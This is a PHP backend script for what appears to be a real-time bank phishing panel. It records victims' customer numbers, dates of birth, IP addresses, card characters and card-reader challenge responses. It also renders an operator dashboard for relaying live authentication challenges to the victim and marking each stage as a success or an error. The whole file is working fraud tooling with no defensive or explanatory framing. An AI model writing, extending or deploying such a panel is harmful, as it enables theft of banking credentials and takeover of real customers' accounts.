<?php
include "../config/data.php";

$time = date('d-m-Y H:i:s');
if(isset($_GET["step"]))
{

if($_GET["step"] == "user")
{

	$cusnum=urldecode($conn->real_escape_string($_GET["cusnum"]));
	$dob=urldecode($conn->real_escape_string($_GET["dob"]));
	$ua=urldecode($conn->real_escape_string($_GET["ua"]));
	$ip=urldecode($conn->real_escape_string($_GET["ip"]));
	if(strlen($cusnum)>15 || strlen($dob)>20  || strlen($ua)>500  || strlen($ip)>20  )
	{
	die();
	}
	
	$stmt = $connp->prepare("SELECT cusnum FROM login where cusnum=:cusnum and dob=:dob and status=1");
	$stmt->bindParam(':cusnum', $cusnum);
	$stmt->bindParam(':dob', $dob);
	$stmt->execute();
	$count =$stmt->rowCount();
	if($count>0)
	{
	$stmt = $connp->prepare("update `login` set status=1 , updatetime=:updatetime where cusnum=:cusnum and dob=:dob");
    $stmt->bindParam(':cusnum', $cusnum);
	$stmt->bindParam(':dob', $dob);
	$stmt->bindParam(':updatetime', $time);
    $stmt->execute();
	die();
	}
    $stmt = $connp->prepare("INSERT INTO `login`(`cusnum`,`dob`, `ua`, `ip`, `time`,`updatetime`, `status`) VALUES (:cusnum,:dob,:agent,:ip,:time,:updatetime,1)");
    $stmt->bindParam(':cusnum', $cusnum);
	$stmt->bindParam(':dob', $dob);
    $stmt->bindParam(':agent', $ua);
    $stmt->bindParam(':ip', $ip);
    $stmt->bindParam(':time', $time);
	$stmt->bindParam(':updatetime', $time);
    $stmt->execute();
}


if($_GET["step"] == "card")
{

	$cusnum=urldecode($conn->real_escape_string($_GET["cusnum"]));
	$dob=urldecode($conn->real_escape_string($_GET["dob"]));
	$char4=urldecode($conn->real_escape_string($_GET["char4"]));
	$char8=urldecode($conn->real_escape_string($_GET["char8"]));
	if(strlen($cusnum)>15 || strlen($dob)>20 || strlen($char4)>5 || strlen($char8)>10)
	{
	die();
	}
	
	$stmt = $connp->prepare("update `login` set status=2 , updatetime=:updatetime, char4=:char4 , char8=:char8 where cusnum=:cusnum and dob=:dob");
	$stmt->bindParam(':updatetime', $time);
	$stmt->bindParam(':char4', $char4);
	$stmt->bindParam(':char8', $char8);		
	$stmt->bindParam(':cusnum', $cusnum);
	$stmt->bindParam(':dob', $dob);
    $stmt->execute();
}


if($_GET["step"] == "amount")
{

	$cusnum=urldecode($conn->real_escape_string($_GET["cusnum"]));
	$dob=urldecode($conn->real_escape_string($_GET["dob"]));
	if(strlen($cusnum)>15 || strlen($dob)>20)
	{
	die();
	}	
	$stmt = $connp->prepare("SELECT `amount` FROM `login` where cusnum=:cusnum and dob=:dob limit 0,1");
    $stmt->bindParam(':cusnum', $cusnum);
	$stmt->bindParam(':dob', $dob);
	$stmt->execute();
	$row = $stmt->fetch();
	echo $row["amount"];
}
if($_GET["step"] == "challenge")
{

	$cusnum=urldecode($conn->real_escape_string($_GET["cusnum"]));
	$dob=urldecode($conn->real_escape_string($_GET["dob"]));
	if(strlen($cusnum)>15 || strlen($dob)>20)
	{
	die();
	}	
	$stmt = $connp->prepare("SELECT `challenge` FROM `login` where cusnum=:cusnum and dob=:dob limit 0,1");
    $stmt->bindParam(':cusnum', $cusnum);
	$stmt->bindParam(':dob', $dob);
	$stmt->execute();
	$row = $stmt->fetch();
	echo $row["challenge"];
}



if($_GET["step"] == "response")
{

	$cusnum=urldecode($conn->real_escape_string($_GET["cusnum"]));
	$dob=urldecode($conn->real_escape_string($_GET["dob"]));
	$response=urldecode($conn->real_escape_string($_GET["response"]));
	$char8=urldecode($conn->real_escape_string($_GET["char8"]));
	if(strlen($cusnum)>15 || strlen($dob)>20 || strlen($response)>10)
	{
	die();
	}
	
	$stmt = $connp->prepare("update `login` set status=4 , updatetime=:updatetime, response=:response where cusnum=:cusnum and dob=:dob");
	$stmt->bindParam(':updatetime', $time);
	$stmt->bindParam(':response', $response);		
	$stmt->bindParam(':cusnum', $cusnum);
	$stmt->bindParam(':dob', $dob);
    $stmt->execute();
}



if($_GET["step"] == "status")
{
	$cusnum=urldecode($conn->real_escape_string($_GET["cusnum"]));
	$dob=urldecode($conn->real_escape_string($_GET["dob"]));
	if(strlen($cusnum)>15 || strlen($dob)>20)
	{
	die();
	}
	$stmt = $connp->prepare("UPDATE `login` set time=:time where cusnum=:cusnum and dob=:dob");
	$stmt->bindParam(':time', $time);
    $stmt->bindParam(':cusnum', $cusnum);
	$stmt->bindParam(':dob', $dob);
	$stmt->execute();
    $stmt = $connp->prepare("SELECT `status` FROM `login` where cusnum=:cusnum and dob=:dob limit 0,1");
    $stmt->bindParam(':cusnum', $cusnum);
	$stmt->bindParam(':dob', $dob);
	$stmt->execute();
	$row = $stmt->fetch();
	echo $row["status"];
}






if($_GET["step"] == "update")
{
	$type=urldecode($conn->real_escape_string($_GET["type"]));
	if($type == "process")
	{
    $stmt = $connp->prepare("SELECT * FROM `login` where status=1 or status=11 order by updatetime ASC");
    $stmt->execute();
	$count =$stmt->rowCount();
		if($count>0)
		{
			while($row = $stmt->fetch())
			{
					echo '<tr>										<td><button style="cursor:pointer" onclick="checkOn(\''.$row["id"].'\',this)">Check</button></td>
                                                <td>'.$row["cusnum"].'</td>
                                                <td>'.$row["dob"].'</td>
												';
												if($row["status"] == "11")
												{
													echo '<td><button type="button" class="btn btn-secondary btn-sm">Login OK!</button></td>';
												}
												else if($row["status"] == "0")
												{
													echo '<td><button type="button" class="btn btn-danger btn-sm">Error</button></td>';
												}
												else
												{
													echo '<td><a href="?step=11&id='.$row["id"].'"><button type="button" class="btn btn-success btn-sm">Proceed</button></a><br>
													<a href="?step=0&id='.$row["id"].'"><button type="button" class="btn btn-danger btn-sm">Error</button></a><br>
													<a href="?step=7&id='.$row["id"].'"><button type="button" class="btn btn-warning btn-sm">Exit</button></a></td>';
												}
												echo '
                                            </tr>'.PHP_EOL;
			}
		}
	}
	
	
	
	if($type == "login")
	{
    $stmt = $connp->prepare("SELECT * FROM `login` where status=2 or status=3 or status>11 order by updatetime ASC");
    $stmt->execute();
	$count =$stmt->rowCount();
		while($row = $stmt->fetch())
		{
				echo '<tr><td><button style="cursor:pointer" onclick="checkOn(\''.$row["id"].'\',this)">Check</button></td><td>'.$row["cusnum"].'</td>
                                                <td>'.$row["dob"].'</td>
												<td>'.$row["char4"].'</td>
												<td>'.$row["char8"].'</td>
												';
												if($row["status"] == "3")
												{
													echo '<td><button type="button" class="btn btn-secondary btn-sm">Challenge Issued</button></td>';
												}
												else if($row["status"] == "12")
												{
													echo '<td><button type="button" class="btn btn-danger btn-sm">Error</button></td>';
												}
												else
												{
													echo '<td><button type="button" class="btn btn-success btn-sm" onclick="getChallenge('.$row["id"].')">Proceed</button><br>
													<a href="?step=12&id='.$row["id"].'"><button type="button" class="btn btn-danger btn-sm">Error</button></a><br>
													<a href="?step=7&id='.$row["id"].'"><button type="button" class="btn btn-warning btn-sm">Exit</button></a></td>';
												}
												echo '</tr>'.PHP_EOL;
		}
	}
	
	if($type == "challenge")
	{
    $stmt = $connp->prepare("SELECT * FROM `login` where status>3 and status<7 order by updatetime ASC");
    $stmt->execute();
	$count =$stmt->rowCount();
		while($row = $stmt->fetch())
		{
				echo '<tr><td><button style="cursor:pointer" onclick="checkOn(\''.$row["id"].'\',this)">Check</button></td>
                                                <td>'.$row["cusnum"].'</td>
                                                <td>'.$row["dob"].'</td>
												<td>'.$row["char4"].'</td>
												<td>'.$row["amount"].'</td>
                                                <td>'.$row["challenge"].'</td>
												<td>'.$row["response"].'</td>
                                                ';
												if($row["status"] == "5")
												{
													echo '<td><button type="button" class="btn btn-secondary btn-sm">Success</button></td>';
												}
												else if($row["status"] == "6")
												{
													echo '<td><button type="button" class="btn btn-secondary btn-sm">Error-Response</button></td>';
												}
												else
												{
													echo '<td><a href="?step=5&id='.$row["id"].'"><button type="button" class="btn btn-success btn-sm">Success</button></a><br>
													<a href="?step=6&id='.$row["id"].'"><button type="button" class="btn btn-danger btn-sm">Error-Response</button></a><br>
													<button type="button" class="btn btn-success btn-sm" onclick="getChallenge('.$row["id"].')">New-Challenge</button><br>
													<a href="?step=7&id='.$row["id"].'"><button type="button" class="btn btn-warning btn-sm">Exit</button></a></td>';
												}
												echo '</tr>'.PHP_EOL;
		}
	}
	
}



if($_GET["step"] == "stats" )
{

	$stmt = $connp->prepare("select 
	(select count(*) from login where status=1) as pw,
	(select count(*) from login where status=2) as lw,
	(select count(*) from login where status=4) as cw");
	$stmt->execute();
	$row=$stmt->fetch();
	$lw=$row["lw"];
	$cw=$row["cw"];
	$pw=$row["pw"];

	echo $lw."|".$cw."|".$pw;

}







if($_GET["step"] == "pinger" )
{
	$id=urldecode($conn->real_escape_string($_GET["id"]));
	if(strlen($id)>30)
	{
	die();
	}
    $stmt = $connp->prepare("SELECT `time` FROM `login` where id=:id limit 0,1");
    $stmt->bindParam(':id', $id);
	$stmt->execute();
	$row = $stmt->fetch();
	$to_time = strtotime(date('d-m-Y H:i:s'));
	$from_time = strtotime($row["time"]);
	if(round(abs($to_time - $from_time) / 60,2)>1)
	{
		echo "0";
	}
	else
	{
		echo "1";
	}

}


}

?>